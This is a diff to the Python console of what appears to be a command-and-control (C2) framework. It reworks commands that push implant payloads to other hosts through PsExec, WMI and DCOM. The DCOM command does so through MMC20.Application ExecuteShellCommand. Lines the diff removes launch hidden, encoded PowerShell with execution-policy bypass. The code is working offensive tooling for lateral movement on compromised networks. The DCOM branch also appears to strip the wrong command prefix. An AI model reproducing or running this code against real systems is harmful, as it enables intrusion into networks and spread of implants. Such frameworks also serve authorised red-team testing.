@@ -317,7 +317,7 @@ def startup(printhelp = ""):
       for t in comtasks:
         hostname = get_implantdetails(t[2])
         if hostname[2] not in users:
-          users += "%s \n" % hostname[2]
+          users += "%s @ %s\n" % (hostname[2],hostname[3])
         if "Upload-File" in t[3]:
           uploadedfile = t[3]
           uploadedfile = uploadedfile.partition("estination ")[2]
@@ -350,7 +350,7 @@ def startup(printhelp = ""):
       else:
         for task in tasks:
           imname = get_implantdetails(task[1])
-          alltasks += "(%s) %s\r\n" % ("%s" % (imname[11]),task[2])
+          alltasks += "(%s) %s\r\n" % ("%s\\%s" % (imname[11],imname[2]),task[2])
         startup("Queued tasks:\r\n\r\n%s" % alltasks)
 
     if (implant_id.lower() == "cleartasks" ) or (implant_id.lower() == "cleartasks "):
@@ -824,18 +824,14 @@ def runcommand(command, randomuri):
 
     elif "invoke-psexecproxypayload" in command.lower():
       check_module_loaded("Invoke-PsExec.ps1", randomuri)
-      C2 = get_c2server_all()
-      if C2[11] == "":
-        startup("Need to run createproxypayload first")
-      else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-            C2[13], C2[11], "", "", C2[19], C2[20],
-            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
+        with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
         params = re.compile("invoke-psexecproxypayload ", re.IGNORECASE)
         params = params.sub("", command)
-        cmd = "invoke-psexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
+        cmd = "invoke-psexec %s -command \"%s\"" % (params,payload)
         new_task(cmd, randomuri)
+      else:
+        startup("Need to run createproxypayload first")
 
     elif "invoke-psexecdaisypayload" in command.lower():
       check_module_loaded("Invoke-PsExec.ps1", randomuri)
@@ -865,18 +861,14 @@ def runcommand(command, randomuri):
 
     elif "invoke-wmiproxypayload" in command.lower():
       check_module_loaded("Invoke-WMIExec.ps1", randomuri)
-      C2 = get_c2server_all()
-      if C2[11] == "":
-        startup("Need to run createproxypayload first")
-      else:
-        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-            C2[13], C2[11], "", "", C2[19], C2[20],
-            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
-        payload = newPayload.CreateRawBase()
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
+        with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
         params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
         params = params.sub("", command)
-        cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
+        cmd = "invoke-wmiexec %s -command \"%s\"" % (params,payload)
         new_task(cmd, randomuri)
+      else:
+        startup("Need to run createproxypayload first")
 
     elif "invoke-wmidaisypayload" in command.lower():
       check_module_loaded("Invoke-WMIExec.ps1", randomuri)
@@ -905,15 +897,16 @@ def runcommand(command, randomuri):
     # dcom lateral movement
 
     elif "invoke-dcomproxypayload" in command.lower():
-      C2 = get_c2server_all()
-      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
-        C2[13], C2[11], "", "", C2[19], C2[20],
-        C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
-      payload = newPayload.CreateRawBase()
-      p = re.compile(ur'(?<=-target.).*')
-      target = re.search(p, command).group()
-      pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
-      new_task(pscommand, randomuri)
+      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,"Proxy"))):
+        with open("%s%spayload.bat" % (PayloadsDirectory,"Proxy"), "r") as p: payload = p.read()
+        params = re.compile("invoke-wmiproxypayload ", re.IGNORECASE)
+        params = params.sub("", command)
+        p = re.compile(ur'(?<=-target.).*')
+        target = re.search(p, command).group()
+        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c %s\",\"7\")" % (target,payload)
+        new_task(pscommand, randomuri)
+      else:
+        startup("Need to run createproxypayload first")
 
     elif "invoke-dcomdaisypayload" in command.lower():
       daisyname = raw_input("Name required: ")
